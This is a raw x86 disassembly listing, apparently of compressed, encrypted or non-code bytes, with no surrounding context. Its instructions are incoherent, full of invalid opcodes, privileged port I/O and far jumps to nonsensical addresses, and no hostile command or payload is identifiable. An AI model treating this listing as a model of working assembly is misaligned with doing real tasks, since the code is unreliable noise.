  40eb9c:	sub    eax,0x32a9be05
  40eba1:	cmc    
  40eba2:	pop    ecx
  40eba3:	xchg   esi,eax
  40eba4:	stos   BYTE PTR es:[edi],al
  40eba5:	dec    eax
  40eba6:	ds xchg ebx,eax
  40eba8:	push   ebx
  40eba9:	aam    0xc0
  40ebab:	cmp    DWORD PTR [eax+eiz*1+0xed698e4],edx
  40ebb2:	je     0x40ec06
  40ebb4:	shl    BYTE PTR ds:0xf9c47280,0x9e
  40ebbb:	inc    ebx
  40ebbc:	arpl   WORD PTR [edi],si
  40ebbe:	pop    eax
  40ebbf:	test   eax,0x270151ed
  40ebc4:	mov    ds:0xe51c6ac0,eax
  40ebc9:	xchg   ebp,eax
  40ebca:	lahf   
  40ebcb:	ins    BYTE PTR es:[edi],dx
  40ebcc:	lds    edi,FWORD PTR [ebx-0x5c3b3252]
  40ebd2:	mov    ecx,0xed980c2a
  40ebd7:	ins    DWORD PTR es:[edi],dx
  40ebd8:	dec    edi
  40ebd9:	inc    esp
  40ebda:	xchg   ecx,eax
  40ebdb:	fist   DWORD PTR [ecx+0x6e7ebb8e]
  40ebe1:	xchg   esi,eax
  40ebe2:	sbb    al,0x7e
  40ebe4:	out    dx,al
  40ebe5:	cmp    al,0xea
  40ebe7:	xchg   edi,eax
  40ebe8:	push   0x83160b13
  40ebed:	jmp    0x7747317b
  40ebf2:	mov    eax,ds:0x9e36bc33
  40ebf7:	push   ebp
  40ebf8:	and    dl,ch
  40ebfa:	test   DWORD PTR [ebp-0x65cd3dc2],esp
  40ec00:	dec    ecx
  40ec01:	and    al,0x4e
  40ec03:	out    dx,al
  40ec04:	jle    0x40ebf5
  40ec06:	loope  0x40ec56
  40ec08:	xchg   ecx,eax
  40ec09:	adc    al,0xa2
  40ec0b:	sub    al,0xb5
  40ec0d:	popf   
  40ec0e:	mov    ch,0x52
  40ec10:	out    dx,al
  40ec11:	jno    0x40ec42
  40ec13:	jbe    0x40ec04
  40ec15:	jmp    0x40cddd79
  40ec1a:	aad    0x7
  40ec1c:	daa    
  40ec1d:	push   edx
  40ec1e:	lea    esp,[esi-0x52]
  40ec21:	jne    0x40ec3b
  40ec23:	add    al,0xe
  40ec25:	inc    esp
  40ec26:	xchg   ebx,eax
  40ec27:	dec    edi
  40ec28:	push   ss
  40ec29:	inc    ebp
  40ec2a:	(bad)  
  40ec2b:	jmp    0x40ebdb
  40ec2d:	loop   0x40ebb0
  40ec2f:	rol    DWORD PTR [ebx+esi*1-0x6056d14c],1
  40ec36:	or     ch,ch
  40ec38:	xor    al,0xed
  40ec3a:	or     BYTE PTR [ebx],al
  40ec3c:	push   es
  40ec3d:	call   0x6b7f95b
  40ec42:	repnz enter 0x8fa7,0xc
  40ec47:	data16 int3 
  40ec49:	mov    dh,0xbf
  40ec4b:	push   ds
  40ec4c:	sbb    DWORD PTR ds:0x708db604,ecx
  40ec52:	add    ch,BYTE PTR [ecx+0x70]
  40ec55:	pop    ss
  40ec56:	inc    ebp
  40ec57:	mov    edi,0x4356ba33
  40ec5c:	mov    al,bh
  40ec5e:	add    DWORD PTR [ebx-0xf],edi
  40ec61:	pop    ss
  40ec62:	lahf   
  40ec63:	push   ebx
  40ec64:	cmp    BYTE PTR [esi],0x6e
  40ec67:	call   0x2a9cf934
  40ec6c:	daa    
  40ec6d:	cmc    
  40ec6e:	out    0x60,ax
  40ec71:	movhps QWORD PTR [esi-0x27588bf2],xmm1
  40ec78:	push   cs
  40ec79:	int3   
  40ec7a:	ret    0x5f4c
  40ec7d:	xchg   ebp,eax
  40ec7e:	mov    eax,0x456717c7
  40ec83:	jno    0x40ec67
  40ec85:	rol    DWORD PTR [ebp+ebx*1+0x58e03eff],cl
  40ec8c:	hlt    
  40ec8d:	test   al,0x9
  40ec8f:	cs mov ebp,0x4cd65239
  40ec95:	sub    cl,BYTE PTR [ebx+0x3048f783]
  40ec9b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec9d:	mov    BYTE PTR [eax-0x3eabecdc],dh
  40eca3:	lahf   
  40eca4:	sbb    ch,BYTE PTR [edi]
  40eca6:	jp     0x40ece2
  40eca8:	xchg   esi,eax
  40eca9:	pop    ebx
  40ecaa:	imul   edi,DWORD PTR [edi],0x9326982
  40ecb0:	adc    DWORD PTR [ecx+0x604dd2d2],ebp
  40ecb6:	inc    esi
  40ecb7:	or     DWORD PTR [edx-0x4be2aaea],eax
  40ecbd:	jnp    0x40ecbe
  40ecbf:	test   dh,cl
  40ecc1:	xchg   edx,eax
  40ecc2:	lea    edi,[ebx-0x58]
  40ecc5:	ds sub eax,0x97f93aa7
  40eccb:	aad    0xb6
  40eccd:	ss add bh,bl
  40ecd0:	jecxz  0x40ec98
  40ecd2:	pop    esi
  40ecd3:	rol    BYTE PTR [edx+edi*4+0x79],1
  40ecd7:	shl    BYTE PTR [edi],0xf0
  40ecda:	pop    ss
  40ecdb:	jo     0x40ec81
  40ecdd:	sbb    DWORD PTR [ebx-0x2b7efd09],eax
  40ece3:	xor    eax,0x1bac6c85
  40ece8:	mov    esi,0xaf013195
  40eced:	dec    edi
  40ecee:	or     BYTE PTR [eax+eiz*8],ch
  40ecf1:	aaa    
  40ecf2:	xor    BYTE PTR [esi],ch
  40ecf4:	dec    esp
  40ecf5:	sbb    al,BYTE PTR [ebx]
  40ecf7:	jl     0x40ec7d
  40ecf9:	jae    0x40ecbb
  40ecfb:	outs   dx,BYTE PTR ds:[esi]
  40ecfc:	pop    ebp
  40ecfd:	out    dx,al
  40ecfe:	xor    esi,DWORD PTR [edi-0x2]
  40ed01:	pop    ss
  40ed02:	mov    cl,0xe8
  40ed04:	or     al,0x81
  40ed06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed07:	sbb    ebp,DWORD PTR [edi+0x5fc5726a]
  40ed0d:	and    eax,0x1c6f9df
  40ed12:	cli    
  40ed13:	and    ebp,0xb610a6ae
  40ed19:	sti    
  40ed1a:	popa   
  40ed1b:	test   DWORD PTR [edx+0x62cd407f],edi
  40ed21:	call   0x112:0xd8b67f09
  40ed28:	mov    dh,0x95
  40ed2a:	mov    ch,0x3d
  40ed2c:	jmp    0x1686:0xb3a51307
  40ed33:	or     DWORD PTR [esi-0x27],0x3e
  40ed37:	mov    cl,0x3d
  40ed39:	mov    eax,ds:0xc43ec47c
  40ed3e:	mov    ebp,0x9de8b6cf
  40ed43:	push   eax
  40ed44:	fcmovbe st,st(7)
  40ed46:	xor    ebx,DWORD PTR [ebp-0x7b]
  40ed49:	outs   dx,BYTE PTR ds:[esi]
  40ed4a:	xor    al,BYTE PTR [edi]
  40ed4c:	neg    BYTE PTR [ebx-0x50]
  40ed4f:	scas   al,BYTE PTR es:[edi]
  40ed50:	xor    eax,0x49643e25
  40ed55:	inc    esi
  40ed56:	aad    0x23
  40ed58:	cmp    ah,BYTE PTR [eax+0x51f3fcb6]
  40ed5e:	pop    edi
  40ed5f:	jnp    0x40ed47
  40ed61:	add    ebp,0x39b3302
  40ed67:	fnstcw WORD PTR [ebx+0x5ae48905]
  40ed6d:	sbb    ah,BYTE PTR [eax+0x3d]
  40ed70:	inc    esp
  40ed71:	mov    al,ds:0xd298b76f
  40ed76:	pusha  
  40ed77:	in     eax,0x1b
  40ed79:	fcmovne st,st(0)
  40ed7b:	nop
  40ed7c:	pushf  
  40ed7d:	(bad)  
  40ed7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed7f:	inc    ebx
  40ed80:	xchg   esp,eax
  40ed81:	cli    
  40ed82:	inc    esi
  40ed83:	jg     0x40edf8
  40ed85:	ins    DWORD PTR es:[edi],dx
  40ed86:	jecxz  0x40ede4
  40ed88:	das    
  40ed89:	sub    al,0x82
  40ed8b:	fwait
  40ed8c:	mov    ?,WORD PTR [edx+0x3d1e4a95]
  40ed92:	sub    BYTE PTR [esi+0x6bcb19db],al
  40ed98:	out    0x80,al
  40ed9a:	iret   
  40ed9b:	jno    0x40eddd
  40ed9d:	xchg   esi,eax
  40ed9e:	cld    
  40ed9f:	jo     0x40ed51
  40eda1:	inc    ecx
  40eda2:	icebp  
  40eda3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eda4:	ret    
  40eda5:	xchg   BYTE PTR [ecx+ecx*1],ch
  40eda8:	xchg   ebx,eax
  40eda9:	dec    ebp
  40edaa:	mov    edi,0x994010da
  40edaf:	push   eax
  40edb0:	call   0x6df0:0x1368a804
  40edb7:	pop    eax
  40edb8:	push   edx
  40edb9:	icebp  
  40edba:	dec    esp
  40edbb:	xor    al,0xc3
  40edbd:	popa   
  40edbe:	loope  0x40edbd
  40edc0:	sub    al,0xd6
  40edc2:	jle    0x40ed6f
  40edc4:	xor    al,0xb
  40edc6:	retf   
  40edc7:	(bad)  
  40edc8:	jns    0x40edcf
  40edca:	fist   DWORD PTR [ebp-0x4b0a1e1d]
  40edd0:	pop    esp
  40edd1:	add    ecx,edi
  40edd3:	and    al,0xa4
  40edd5:	xchg   ebp,eax
  40edd6:	ss adc eax,edi
  40edd9:	fst    st(0)
  40eddb:	(bad)  
  40eddc:	pop    edx
  40eddd:	test   eax,0xd51a844c
  40ede2:	rcr    esp,0x1e
  40ede5:	inc    edi
  40ede6:	stos   DWORD PTR es:[edi],eax
  40ede7:	jo     0x40ed9d
  40ede9:	push   0x445ae189
  40edee:	jp     0x40ed98
  40edf0:	adc    cl,ah
  40edf2:	(bad)  
  40edf3:	(bad)  
  40edf4:	xchg   ecx,eax
  40edf5:	add    eax,0x643e0849
  40edfa:	mov    esi,0xeff519fa
  40edff:	cmp    al,0x73
  40ee01:	loope  0x40ee47
  40ee03:	std    
  40ee04:	loop   0x40ee46
  40ee06:	mov    ebx,0x86a5911d
  40ee0b:	shr    dh,0x9d
  40ee0e:	pop    edi
  40ee0f:	mov    ebx,0x3b3ffd83
  40ee14:	mov    ?,WORD PTR [ebx-0x5de69d82]
  40ee1a:	mov    bl,0x9
  40ee1c:	and    BYTE PTR [eax-0x4],ch
  40ee1f:	sbb    ch,BYTE PTR [ecx+0x75]
  40ee22:	rcr    DWORD PTR [ecx+eax*2+0x30],0xa
  40ee27:	xchg   edx,eax
  40ee28:	mov    ds:0xcdbae0be,eax
  40ee2d:	fiadd  DWORD PTR [ebx+ebp*1+0x6f]
  40ee31:	fsub   DWORD PTR [esi+0x61]
  40ee34:	or     edi,eax
  40ee36:	and    BYTE PTR [ebx+0x24ac9959],0x5d
  40ee3d:	pop    esp
  40ee3e:	in     al,0x5d
  40ee40:	pushf  
  40ee41:	xor    eax,0xde9f5d46
  40ee46:	push   ds
  40ee47:	mov    dh,0xdd
  40ee49:	cmp    dl,BYTE PTR [eax]
  40ee4b:	push   ss
  40ee4c:	imul   ebp,esi,0x47
  40ee4f:	popf   
  40ee50:	cmp    al,0xa6
  40ee52:	cli    
  40ee53:	std    
  40ee54:	mov    esi,0x8e14ace1
  40ee59:	mov    ch,0xfc
  40ee5b:	or     al,0xed
  40ee5d:	stos   BYTE PTR es:[edi],al
  40ee5e:	mov    al,ds:0xcd55c592
  40ee63:	out    0x7,al
  40ee65:	and    BYTE PTR [esi+ebp*4-0x1dc9fd3],bl
  40ee6c:	dec    edx
  40ee6d:	xor    al,0x89
  40ee6f:	mov    ebp,0x5c76cde1
  40ee74:	pusha  
  40ee75:	mov    gs,WORD PTR [ecx]
  40ee77:	ret    0xd7cf
  40ee7a:	loop   0x40eedc
  40ee7c:	mov    ebp,0x9cffd954
  40ee81:	addr16 gs fcom st(1)
  40ee85:	xlat   BYTE PTR ds:[ebx]
  40ee86:	xor    BYTE PTR [eax-0x36],cl
  40ee89:	mov    DWORD PTR [ebp+ecx*8-0x10],ecx
  40ee8d:	test   eax,0xf78900b6
  40ee92:	inc    eax
  40ee93:	fsubr  QWORD PTR [edi-0x3a]
  40ee96:	(bad)  
  40ee97:	pop    eax
  40ee98:	xchg   edi,eax
  40ee99:	out    0x19,eax
  40ee9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee9c:	es sti 
  40ee9e:	dec    esp
  40ee9f:	cwde   
  40eea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea1:	das    
  40eea2:	push   ds
  40eea3:	mov    ecx,0xa81c39e0
  40eea8:	hlt    
  40eea9:	cmc    
  40eeaa:	ja     0x40ef08
  40eeac:	push   edx
  40eead:	ja     0x40eeea
  40eeaf:	dec    edi
  40eeb0:	dec    DWORD PTR [esi]
  40eeb2:	test   eax,0xee6ed592
  40eeb7:	push   es
  40eeb8:	inc    esp
  40eeb9:	or     esp,DWORD PTR [ebx]
  40eebb:	outs   dx,BYTE PTR ds:[esi]
  40eebc:	pop    es
  40eebd:	pop    edi
  40eebe:	or     al,0x79
  40eec0:	mov    ds:0x5814c7b4,eax
  40eec5:	xchg   edi,eax
  40eec6:	popa   
  40eec7:	aam    0x10
  40eec9:	jne    0x40ef16
  40eecb:	mov    BYTE PTR cs:[edx+eax*2-0x66019452],ch
  40eed3:	in     eax,0x44
  40eed5:	push   edi
  40eed6:	add    ebp,esp
  40eed8:	dec    ecx
  40eed9:	pop    eax
  40eeda:	jge    0x40eec1
  40eedc:	call   0xf2ac:0x93ec2b68
  40eee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eee4:	jle    0x40eed1
  40eee6:	xor    al,0x9c
  40eee8:	sub    al,0x7b
  40eeea:	cli    
  40eeeb:	call   FWORD PTR ds:[edi-0x51977a75]
  40eef2:	jge    0x40ee7e
  40eef4:	mov    bl,0x7f
  40eef6:	sub    al,0x70
  40eef8:	(bad)  
  40eef9:	std    
  40eefa:	fisttp QWORD PTR [eax+0x2e]
  40eefd:	not    edi
  40eeff:	mov    ebx,0x452a17b
  40ef04:	lds    eax,FWORD PTR [esi]
  40ef06:	sbb    esi,eax
  40ef08:	jo     0x40ef37
  40ef0a:	out    dx,eax
  40ef0b:	mov    edx,esp
  40ef0d:	or     cl,BYTE PTR [ecx+0x31]
  40ef10:	lods   al,BYTE PTR ds:[esi]
  40ef11:	jecxz  0x40eec2
  40ef13:	cmp    eax,0x135cd740
  40ef18:	and    eax,0xe19e252c
  40ef1d:	out    dx,al
  40ef1e:	xchg   ebx,eax
  40ef1f:	dec    ebx
  40ef20:	push   eax
  40ef21:	int3   
  40ef22:	lods   eax,DWORD PTR ds:[esi]
  40ef23:	repnz retf 
  40ef25:	mov    ?,WORD PTR [ebx+0x57]
  40ef28:	dec    ecx
  40ef29:	cwde   
  40ef2a:	out    0x4b,eax
  40ef2c:	scas   al,BYTE PTR es:[edi]
  40ef2d:	jg     0x40ef38
  40ef2f:	and    DWORD PTR [eax],edx
  40ef31:	addr16 jl 0x40eee0
  40ef34:	add    eax,0x5eb761fd
  40ef39:	stos   BYTE PTR es:[edi],al
  40ef3a:	jp     0x40ef01
  40ef3c:	add    ecx,ecx
  40ef3e:	cmc    
  40ef3f:	jmp    0x2ec2:0xa8401027
  40ef46:	stos   DWORD PTR es:[edi],eax
  40ef47:	xchg   ecx,eax
  40ef48:	int    0xad
  40ef4a:	or     BYTE PTR ds:0x2322508b,0x82
  40ef51:	mov    dh,0xee
  40ef53:	sub    esp,ebp
  40ef55:	inc    eax
  40ef56:	mov    ebx,0x5dfdb407
  40ef5b:	push   eax
  40ef5c:	pop    edx
  40ef5d:	jb     0x40efc3
  40ef5f:	mov    ebx,0xe653c65a
  40ef64:	pop    ebp
  40ef65:	cs pusha 
  40ef67:	jge    0x40eef3
  40ef69:	sbb    ebp,eax
  40ef6b:	clc    
  40ef6c:	(bad)  
  40ef70:	nop
  40ef71:	jecxz  0x40ef5a
  40ef73:	and    BYTE PTR [ecx+ecx*2-0x96fbac1],ch
  40ef7a:	es inc esp
  40ef7c:	mov    esp,0x54d8b28f
  40ef81:	pop    eax
  40ef82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef83:	jnp    0x40efe8
  40ef85:	inc    esi
  40ef86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef87:	mov    dh,0xaa
  40ef89:	adc    al,0x3d
  40ef8b:	cmp    bh,cl
  40ef8d:	mov    bl,BYTE PTR [ebx]
  40ef8f:	aad    0x29
  40ef91:	imul   DWORD PTR [edx]
  40ef93:	cdq    
  40ef94:	lahf   
  40ef95:	cmp    ebx,DWORD PTR ds:0xdf7cac19
  40ef9b:	adc    BYTE PTR [ecx-0x4],0xa9
  40ef9f:	xor    DWORD PTR [ecx-0x409cc4df],eax
  40efa5:	scas   al,BYTE PTR es:[edi]
  40efa6:	mov    ebp,0x868197a8
  40efab:	ret    0xf26f
  40efae:	rcr    DWORD PTR [edx-0x48],1
  40efb1:	xchg   DWORD PTR [ebp-0x6db90ae6],edx
  40efb7:	push   ds
  40efb8:	ficomp DWORD PTR [ebx]
  40efba:	or     cl,BYTE PTR [ebp+0x36]
  40efbd:	sub    edi,DWORD PTR [edi-0x18]
  40efc0:	sbb    dl,BYTE PTR [eax]
  40efc2:	adc    al,BYTE PTR [ebp-0x641b5ced]
  40efc8:	(bad)  
  40efc9:	dec    eax
  40efca:	call   0xa4c1e031
  40efcf:	int3   
  40efd0:	sub    eax,0x616df2b3
  40efd5:	jle    0x40efac
  40efd7:	or     BYTE PTR [edi-0x5487e04c],ch
  40efdd:	icebp  
  40efde:	xor    eax,0x4e1ea344
  40efe3:	bound  ecx,QWORD PTR [ebx+0x7bf0cba1]
  40efe9:	mov    ebx,0x8d5fb9fd
  40efee:	lods   al,BYTE PTR ds:[esi]
  40efef:	fwait
  40eff0:	test   DWORD PTR [edi+edi*8+0x4428f9ce],0x7b659aa2
  40effb:	push   es
  40effc:	xor    al,0x63
  40effe:	adc    al,0x3b
  40f000:	in     eax,dx
  40f001:	sub    BYTE PTR [edx],dl
  40f003:	mov    al,0x24
  40f005:	mov    ds:0x5871bd84,al
  40f00a:	inc    ebx
  40f00b:	loopne 0x40f05a
  40f00d:	pop    es
  40f00e:	pop    eax
  40f00f:	test   dh,ch
  40f011:	xor    eax,0xb06f109b
  40f016:	in     al,0x49
  40f018:	je     0x40f04b
  40f01a:	jl     0x40f093
  40f01c:	xchg   ebp,eax
  40f01d:	mov    dl,0xec
  40f01f:	jmp    0x40f045
  40f021:	mov    al,0xca
  40f023:	and    eax,0xf1dd705f
  40f028:	and    ecx,edi
  40f02a:	(bad)  
  40f02b:	lods   al,BYTE PTR ds:[esi]
  40f02c:	pop    esi
  40f02d:	push   eax
  40f02e:	xor    BYTE PTR [eax-0x5eaea6c7],al
  40f034:	clc    
  40f035:	push   esi
  40f036:	imul   edx,DWORD PTR [ecx+0x56],0x77cc6e66
  40f03d:	scas   eax,DWORD PTR es:[edi]
  40f03e:	mov    al,ds:0x4d832177
  40f043:	test   eax,0x87207380
  40f048:	mov    esp,0x5317109a
  40f04d:	push   ss
  40f04e:	mov    DWORD PTR [esi-0x39],eax
  40f051:	mov    ?,WORD PTR [esp+ecx*8+0x3a25c718]
  40f058:	cmp    ebp,esp
  40f05a:	cmp    al,0x2e
  40f05c:	in     eax,dx
  40f05d:	inc    eax
  40f05e:	pop    ebx
  40f05f:	pop    esi
  40f060:	xor    DWORD PTR [ebx],ecx
  40f062:	(bad)  
  40f063:	mov    cl,0x28
  40f065:	scas   al,BYTE PTR es:[edi]
  40f066:	mov    DWORD PTR [ebp-0x77],edx
  40f069:	add    al,0xe0
  40f06b:	pop    ecx
  40f06c:	add    BYTE PTR [edi+0x75],dl
  40f06f:	xchg   esi,eax
  40f070:	jle    0x40f00f
  40f072:	push   ebp
  40f073:	clc    
  40f074:	hlt    
  40f075:	cmp    al,0xe9
  40f077:	data16 aas 
  40f079:	mov    edx,0xfdad9493
  40f07e:	lods   al,BYTE PTR ds:[esi]
  40f07f:	(bad)  
  40f080:	fsub   QWORD PTR [edx+ebx*8]
  40f083:	clc    
  40f084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f085:	cmc    
  40f086:	shl    DWORD PTR ds:0x488eadbb,cl
  40f08c:	jp     0x40f024
  40f08e:	aaa    
  40f08f:	pusha  
  40f090:	inc    esi
  40f091:	jmp    0x40f0e1
  40f093:	nop
  40f094:	into   
  40f095:	retf   0x8dce
  40f098:	imul   edi,DWORD PTR [ecx+0x41],0x25
  40f09c:	push   ds
  40f09d:	ins    BYTE PTR es:[edi],dx
  40f09e:	iret   
  40f09f:	lahf   
  40f0a0:	mov    edi,0x1483abdd
  40f0a5:	add    edi,DWORD PTR [ebp+0x48]
  40f0a8:	imul   esp,DWORD PTR [ecx+edx*1+0x16],0x94122664
  40f0b0:	in     eax,0x80
  40f0b2:	jg     0x40f08a
  40f0b4:	xchg   ecx,eax
  40f0b5:	jno    0x40f0bf
  40f0b7:	cld    
  40f0b8:	mul    BYTE PTR [ebp+0x6d]
  40f0bb:	adc    esp,DWORD PTR [ebp+0x52da17e6]
  40f0c1:	mov    esp,0x97cdbb80
  40f0c6:	rcr    BYTE PTR ss:[esp+edi*2],cl
  40f0ca:	xor    eax,0xf9b003ae
  40f0cf:	aaa    
  40f0d0:	clc    
  40f0d1:	ds inc ebx
  40f0d3:	mov    edx,0x71f18006
  40f0d8:	pop    ds
  40f0d9:	jge    0x40f080
  40f0db:	repz or eax,DWORD PTR [edi]
  40f0de:	arpl   WORD PTR [esi],dx
  40f0e0:	fiadd  DWORD PTR [edi+esi*8-0x5f43e0b4]
  40f0e7:	fsub   QWORD PTR [esi+ecx*8-0x5969cf22]
  40f0ee:	arpl   dx,ax
  40f0f0:	nop
  40f0f1:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40f0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0f4:	shr    BYTE PTR [eax+0x15e70aa9],1
  40f0fa:	pop    edx
  40f0fb:	addr16 mov dl,0xb3
  40f0fe:	and    cl,BYTE PTR [bp+0x4864]
  40f103:	(bad)  
  40f105:	mov    bl,0x12
  40f107:	mov    bh,0x67
  40f109:	outs   dx,DWORD PTR ds:[esi]
  40f10a:	add    BYTE PTR [edx-0x43],0xe5
  40f10e:	mov    ah,0xda
  40f110:	icebp  
  40f111:	call   edi
  40f113:	bound  ebp,QWORD PTR [edi*8-0x7fcd1707]
  40f11a:	xchg   esp,eax
  40f11b:	mov    edi,0x438bdb5e
  40f120:	int3   
  40f121:	pusha  
  40f122:	repz jns 0x40f0bc
  40f125:	cmp    DWORD PTR [esi+0x70017669],esi
  40f12b:	jae    0x40f199
  40f12d:	sbb    al,0x4e
  40f12f:	or     eax,0xe5539938
  40f134:	sbb    al,0x60
  40f136:	test   BYTE PTR [edx],bh
  40f138:	(bad)  
  40f139:	push   ebx
  40f13a:	jecxz  0x40f102
  40f13c:	stos   BYTE PTR es:[edi],al
  40f13d:	scas   eax,DWORD PTR es:[edi]
  40f13e:	daa    
  40f13f:	mov    ebx,0xb1a44492
  40f144:	sbb    ch,dh
  40f146:	xchg   edx,eax
  40f147:	and    ecx,ebx
  40f149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f14a:	inc    ebx
  40f14b:	out    dx,eax
  40f14c:	popf   
  40f14d:	in     eax,dx
  40f14e:	and    BYTE PTR [edi+0x37d2041a],bh
  40f154:	dec    esp
  40f155:	int    0xd
  40f157:	push   edi
  40f158:	sub    dh,ch
  40f15a:	sbb    ch,BYTE PTR [eax+0x7861dac0]
  40f160:	cmp    eax,0x534db7ce
  40f165:	leave  
  40f166:	jp     0x40f1ba
  40f168:	mov    edx,0x158c459e
  40f16d:	sbb    eax,0x1701eca5
  40f172:	out    0xc7,eax
  40f174:	pop    DWORD PTR [ebx+0x2ff3dfef]
  40f17a:	add    al,0xf0
  40f17c:	sbb    eax,DWORD PTR [ebx]
  40f17e:	nop
  40f17f:	mov    edx,0x6d32c403
  40f184:	xor    dl,dh
  40f186:	and    ebx,DWORD PTR [ecx+0x21]
  40f189:	or     BYTE PTR [esi-0x6f],al
  40f18c:	or     DWORD PTR [eax],esp
  40f18e:	jb     0x40f114
  40f190:	adc    BYTE PTR [ebx+ebx*4-0x2f],ch
  40f194:	jb     0x40f13f
  40f196:	loopne 0x40f1b7
  40f198:	fsubr  QWORD PTR [edx-0x5f]
  40f19b:	nop
  40f19c:	xchg   esp,eax
  40f19d:	repnz mov esi,0x356af19
  40f1a3:	add    bh,BYTE PTR [ecx+0x37cd53ef]
  40f1a9:	add    al,0xb3
  40f1ab:	mov    ss,eax
  40f1ad:	cli    
  40f1ae:	stos   DWORD PTR es:[edi],eax
  40f1af:	adc    ah,BYTE PTR [eax-0x9]
  40f1b2:	push   0x5c7e55aa
  40f1b7:	adc    BYTE PTR [ecx],dh
  40f1b9:	or     edx,esi
  40f1bb:	add    bh,bh
  40f1bd:	pop    edx
  40f1be:	sbb    edx,ecx
  40f1c0:	mov    bl,0xc
  40f1c2:	js     0x40f1f1
  40f1c4:	jo     0x40f242
  40f1c6:	mov    esi,0xce8561c4
  40f1cb:	mov    ecx,0xd88741ae
  40f1d0:	aad    0x5f
  40f1d2:	add    eax,0xf9ae0d76
  40f1d7:	mov    ebp,0xbc2c398f
  40f1dc:	inc    ebp
  40f1dd:	cmp    BYTE PTR [ecx+0x704d4f78],al
  40f1e3:	inc    esi
  40f1e4:	in     al,0xb
  40f1e6:	pop    esi
  40f1e7:	sbb    eax,0xcdaff4c2
  40f1ec:	mov    ecx,0x70f2e875
  40f1f1:	pushf  
  40f1f2:	jl     0x40f188
  40f1f4:	xchg   ebx,eax
  40f1f5:	les    ecx,FWORD PTR [eax]
  40f1f7:	sbb    DWORD PTR [ebp+0x37],ebx
  40f1fa:	cmp    ebp,esi
  40f1fc:	imul   edi,esi,0xa89342e7
  40f202:	fnstenv [edi]
  40f204:	test   al,0x13
  40f206:	mov    ch,0xd0
  40f208:	pop    ds
  40f209:	mov    ebp,0xe11f02a9
  40f20e:	xor    ch,BYTE PTR [ebp-0x66ba528]
  40f214:	test   BYTE PTR [ecx],bl
  40f216:	cld    
  40f217:	xor    al,0x8d
  40f219:	mov    ebx,0x944f678a
  40f21e:	ins    DWORD PTR es:[edi],dx
  40f21f:	jb     0x40f297
  40f221:	sbb    eax,ebp
  40f223:	mov    DWORD PTR [edx-0x35],edx
  40f226:	xor    al,0x64
  40f228:	fld    DWORD PTR [edi+0xb]
  40f22b:	xor    al,BYTE PTR [ecx+ecx*4-0x70]
  40f22f:	lods   al,BYTE PTR ds:[esi]
  40f230:	add    DWORD PTR [esp+ebp*2+0x20],ecx
  40f234:	mov    al,ds:0xb5665bf5
  40f239:	pop    ds
  40f23a:	(bad)  
  40f23b:	cwde   
  40f23c:	cmp    al,0x5b
  40f23e:	or     al,0xc8
  40f240:	ja     0x40f1e2
  40f242:	xor    BYTE PTR [ebp+ebp*4-0x6ecef853],ch
  40f249:	jbe    0x40f244
  40f24b:	cmp    BYTE PTR [edx-0x6e],0xb4
  40f24f:	mov    ch,0x22
  40f251:	pop    edi
  40f252:	mov    ds:0xb8d367d3,eax
  40f257:	cmp    eax,0x2d249289
  40f25c:	mov    esp,?
  40f25e:	es pop ds
  40f260:	jle    0x40f2d3
  40f262:	aad    0x2a
  40f264:	sbb    eax,0x5e0dcde4
  40f269:	jne    0x40f256
  40f26b:	ud2    
  40f26d:	ror    dh,cl
  40f26f:	fidivr WORD PTR [ebx+0x56]
  40f272:	and    al,BYTE PTR [eax+0x35]
  40f275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f276:	je     0x40f287
  40f278:	lods   eax,DWORD PTR ds:[esi]
  40f279:	cmp    esi,DWORD PTR [eax]
  40f27b:	in     al,0xb9
  40f27d:	mov    edx,0x4da6a0db
  40f282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f283:	in     eax,0xf1
  40f285:	arpl   WORD PTR [eax+0x4d44f131],bx
  40f28b:	loop   0x40f2cf
  40f28d:	sbb    eax,0xb1d855e8
  40f292:	mov    edi,DWORD PTR [ebp+0x139c9a9b]
  40f298:	stos   DWORD PTR es:[edi],eax
  40f299:	adc    edi,DWORD PTR [esi+0x39288359]
  40f29f:	imul   edx,esi,0x4f88ccf2
  40f2a5:	rcl    bh,cl
  40f2a7:	or     al,0xc9
  40f2a9:	sub    BYTE PTR [ecx+edx*8+0x66],al
  40f2ad:	shl    DWORD PTR [ecx+0x32],cl
  40f2b0:	shl    DWORD PTR [edi],1
  40f2b2:	cmp    DWORD PTR [esi+0x71],edx
  40f2b5:	mov    al,ds:0xbf3def5f
  40f2ba:	jle    0x40f318
  40f2bc:	pop    ss
  40f2bd:	mov    edx,0x868cd624
  40f2c2:	push   esp
  40f2c3:	test   DWORD PTR [esi],ebp
  40f2c5:	xchg   DWORD PTR [edi-0x32],ebx
  40f2c8:	mov    esp,0xae2df318
  40f2cd:	sbb    ecx,ecx
  40f2cf:	div    DWORD PTR [ebp+0x1b9e3287]
  40f2d5:	pop    esp
  40f2d6:	pop    esi
  40f2d7:	jae    0x40f340
  40f2d9:	mov    dl,0xd
  40f2db:	fidivr DWORD PTR [edx]
  40f2dd:	ret    
  40f2de:	sub    eax,0xb7046dec
  40f2e3:	dec    esi
  40f2e4:	jg     0x40f30c
  40f2e6:	ds add al,0xb4
  40f2e9:	pop    eax
  40f2ea:	enter  0xe030,0xee
  40f2ee:	and    ch,BYTE PTR ds:0xdcef1f51
  40f2f4:	jp     0x40f341
  40f2f6:	push   edi
  40f2f7:	jmp    0xcf6efc4f
  40f2fc:	add    eax,0xc1e1c88d
  40f301:	pushf  
  40f302:	mov    cs,WORD PTR [edi]
  40f304:	inc    edi
  40f305:	xlat   BYTE PTR ds:[ebx]
  40f306:	mov    DWORD PTR [esp+edi*1-0x16],eax
  40f30a:	ss pop edx
